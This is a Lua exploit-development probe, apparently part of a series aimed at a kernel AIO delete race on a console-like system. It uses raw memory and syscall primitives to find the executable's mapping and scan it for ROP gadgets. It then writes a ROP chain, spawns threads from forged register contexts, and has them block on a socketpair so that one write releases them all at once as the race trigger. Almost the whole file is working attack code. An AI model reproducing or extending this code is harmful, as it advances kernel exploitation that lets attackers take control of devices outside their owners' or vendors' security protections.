-- CRASH_CLASS: HIGH
-- PROBE 758a: children that block in read, and a single write that releases all
--
-- The aio delete race never overlaps because thr_create spawns children about a
-- hundred microseconds apart while the delete path is about ten. 757b found no
-- spin gadget in eboot, so the release has to come from the kernel: every child
-- starts by calling read() on one end of a socketpair, which blocks, and the
-- parent writes one byte per child to the other end. All the blocked readers
-- are woken by that one write and reach their next syscall within microseconds
-- of each other.
--
-- This probe proves the pattern without touching aio: three children block in
-- read, the parent checks the buffers are still zero (so they really blocked),
-- writes three bytes, and checks every buffer reads 1 (bytes returned) and the
-- process is alive.

print("=== PROBE 758a: BLOCKED CHILDREN, ONE WAKE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local fn = to_num(syscall.pipe.fn_addr)
print(string.format("[A] tid=%s fn=%08X", tostring(call(syscall.pipe, 20,0,0,0,0,0,0)), fn))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

-- gadgets
local ebase = nil
do
    local rb = mmap(0x8000)
    local cnt = to_num(memory.alloc(8)); wd(cnt, 0)
    local rc = call(mk(674), rb, 72, 512, cnt, 0x40000000, 0)
    local n = rd(cnt) or 0
    local best, bsz = nil, 0
    for i=0,math.min(n,512)-1 do
        local r = rb + i*72
        local a = rd(r) + rd(r+4)*4294967296
        local b = rd(r+8) + rd(r+12)*4294967296
        if rd(r+0x18) == 5 and (b-a) > 0x200000 and a < 0x1000000000 and (b-a) > bsz then best, bsz = a, b-a end
    end
    ebase = best
    print(string.format("[A] eboot=%s size=%X", tostring(ebase), bsz))
end
if not ebase then print("[A] no eboot") return end

local function find_pat(base, size, pat)
    local off, limit = 0, size - 0x20
    local chunk = 0x8000
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local st_rsi = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x06,0xC3))  -- mov [rsi],rax;ret
local jmp_g  = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))            -- jmp $
local pop_rax= find_pat(ebase, 0x494000, string.char(0x58,0xC3))
print(string.format("[A] st_rsi=%s jmp$=%s poprax=%s", tostring(st_rsi), tostring(jmp_g), tostring(pop_rax)))
if not (st_rsi and jmp_g and pop_rax) then print("[A] gadgets missing") return end

-- socketpair
local sv = to_num(memory.alloc(8)); wq(sv, uint64(0))
local sp = call(mk(135), 1, 1, 0, sv, 0, 0)
local s0, s1 = rd(sv), rd(sv+4)
print(string.format("[A] socketpair ret=%s fd0=%s fd1=%s", tostring(sp), tostring(s0), tostring(s1)))

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local KIDS = 3
local results = mmap(page)
local chain = mmap(page)
wq(chain+0, uint64(st_rsi))
wq(chain+8, uint64(pop_rax)); wq(chain+16, uint64(431))
wq(chain+24, uint64(fn));     wq(chain+32, uint64(jmp_g))

print("[B] spawning children that block in read(s0)")
for i=0,KIDS-1 do
    local ctx = to_num(memory.alloc(0x500))
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(chain))
    wq(ctx+Ctx.RDI, uint64(s0));      wq(ctx+Ctx.RSI, uint64(results + i*8))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(3))
    local tb = to_num(memory.alloc(8)); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    print(string.format("[B] kid %d ok=%s rv=%s tid=%s", i, tostring(ok), tostring(ok and to_num(rv) or "x"), tostring(rd(tb))))
end

-- give them time to reach the read
local ts = to_num(memory.alloc(16))
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
sleep_ms(80)

local before = {}
for i=0,KIDS-1 do before[i] = rq(results + i*8) or -1 end
print(string.format("[C] before wake: %s %s %s", tostring(before[0]), tostring(before[1]), tostring(before[2])))

local pay = mmap(page)
for i=0,KIDS-1 do pcall(function() memory.write_byte(pay+i, 0x41+i) end) end
local wr = call(mk(4), s1, pay, KIDS, 0, 0, 0)
print(string.format("[D] write(%s, %d) = %s", tostring(s1), KIDS, tostring(wr)))

sleep_ms(60)
local after = {}
for i=0,KIDS-1 do after[i] = rq(results + i*8) or -1 end
print(string.format("[E] after wake: %s %s %s", tostring(after[0]), tostring(after[1]), tostring(after[2])))
print("[F] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 758a DONE ===")
